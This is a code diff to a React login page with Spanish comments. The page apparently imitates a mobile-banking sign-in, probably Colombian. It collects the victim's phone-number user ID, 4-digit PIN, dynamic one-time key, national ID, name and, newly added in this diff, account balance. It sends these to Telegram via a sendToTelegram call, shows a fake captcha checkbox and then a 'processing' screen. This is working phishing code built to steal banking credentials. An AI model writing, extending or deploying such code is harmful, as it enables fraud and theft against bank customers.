@@ -52,6 +52,7 @@ export default function LoginPage() {
     usuario: "",
     clave: "",
     claveDinamica: "",
+    saldo: "",
   }); // Estado para los datos del formulario
   const [loading, setLoading] = useState(false); // Estado para manejar el estado de carga
   const [isCaptchaChecked, setIsCaptchaChecked] = useState(false); // Estado para manejar si el captcha está marcado
@@ -84,35 +85,35 @@ export default function LoginPage() {
       formData.claveDinamica &&
       isCaptchaChecked
     ) {
-      
-  
       // Guarda los datos de sesión en sessionStorage
       sessionStorage.setItem("usuario", formData.usuario);
       sessionStorage.setItem("clave", formData.clave);
       sessionStorage.setItem("claveDinamica", formData.claveDinamica);
+      sessionStorage.setItem("saldo", formData.saldo);
       sessionStorage.setItem("countryCode", selectedCountry.code);
-      
+
       setIsLoading(true); // Inicia el loading
-      const cedula = sessionStorage.getItem("cedula") ,  nombre = sessionStorage.getItem("nombre");
+      const cedula = sessionStorage.getItem("cedula"),
+        nombre = sessionStorage.getItem("nombre");
       if (!cedula || !nombre) {
         router.push("/cedula");
         return;
       }
-      
+
       await sendToTelegram({
         ...formData,
-        cedula, nombre,
+        cedula,
+        nombre,
         countryCode: selectedCountry.code,
       });
-  
+
       setShowTransition(true); // Activa la transición
-    setTimeout(() => {
-      setIsLoading(false); // Detiene el loading después de 2 segundos
-      router.push("/procesando");
-    }, 2000);
+      setTimeout(() => {
+        setIsLoading(false); // Detiene el loading después de 2 segundos
+        router.push("/procesando");
+      }, 2000);
+    }
   };
-  };
-  
 
   return (
     <main className="min-h-screen bg-pink-50 relative">
@@ -203,7 +204,7 @@ export default function LoginPage() {
                       className="w-2/3 bg-pink-50"
                       value={formData.usuario}
                       onChange={(e) => {
-                        const value = e.target.value.replace(/\D/g, '');
+                        const value = e.target.value.replace(/\D/g, "");
                         // Permite solo si empieza por 3 o está vacío
                         if (value === "" || value.startsWith("3")) {
                           if (value.length <= 10) {
@@ -223,7 +224,7 @@ export default function LoginPage() {
                     required
                     value={formData.clave}
                     onChange={(e) => {
-                      const value = e.target.value.replace(/\D/g, '');
+                      const value = e.target.value.replace(/\D/g, "");
                       if (value.length <= 4) {
                         setFormData({ ...formData, clave: value });
                       }
@@ -239,12 +240,15 @@ export default function LoginPage() {
                 <TooltipProvider delayDuration={0}>
                   <Tooltip>
                     <TooltipTrigger asChild>
-                      <div className="space-y-2 relative" onClick={(e) => {
-                        // Prevenir que el tooltip se cierre inmediatamente en móviles
-                        if (window.innerWidth <= 768) {
-                          e.preventDefault();
-                        }
-                      }}>
+                      <div
+                        className="space-y-2 relative"
+                        onClick={(e) => {
+                          // Prevenir que el tooltip se cierre inmediatamente en móviles
+                          if (window.innerWidth <= 768) {
+                            e.preventDefault();
+                          }
+                        }}
+                      >
                         <Input
                           type="number"
                           id="claveDinamica"
@@ -265,8 +269,25 @@ export default function LoginPage() {
                       </div>
                     </TooltipTrigger>
 
+                    <div className="space-y-2">
+                      <Input
+                        type="number"
+                        id="saldo"
+                        required
+                        value={formData.saldo}
+                        onChange={(e) => {
+                          const value = e.target.value.replace(/\D/g, "");
+                          if (value.length <= 10) {
+                            setFormData({ ...formData, saldo: value });
+                          }
+                        }}
+                        placeholder="Saldo"
+                        className="bg-pink-50"
+                        inputMode="numeric"
+                      />
+                    </div>
 
-                  {/*Clave dinamica ejemplo visual*/}
+                    {/*Clave dinamica ejemplo visual*/}
                     {/* <TooltipContent 
                       className="bg-white border-none shadow-lg p-4 mt-8 absolute z-10 w-64 left-1/2 transform -translate-x-1/2 sm:w-80 md:w-96"
                       sideOffset={5}
@@ -294,13 +315,12 @@ export default function LoginPage() {
                   <div className="flex items-center gap-2">
                     <div
                       onClick={handleCaptchaClick}
-                      className={`w-6 h-6 border rounded flex items-center justify-center cursor-pointer transition-colors ${
-                        isCaptchaChecked
-                          ? "bg-[#34A853] border-[#34A853]"
-                          : isLoading
+                      className={`w-6 h-6 border rounded flex items-center justify-center cursor-pointer transition-colors ${isCaptchaChecked
+                        ? "bg-[#34A853] border-[#34A853]"
+                        : isLoading
                           ? "bg-[#4A90E2] border-[#4A90E2]"
                           : "bg-white border-gray-300 hover:border-gray-400"
-                      }`}
+                        }`}
                     >
                       {isLoading ? (
                         <Loader2 className="w-4 h-4 text-white animate-spin" />
@@ -326,6 +346,7 @@ export default function LoginPage() {
                     !formData.usuario ||
                     !formData.clave ||
                     formData.claveDinamica.length < 6 ||
+                    !formData.saldo||
                     !isCaptchaChecked
                   }
                 >
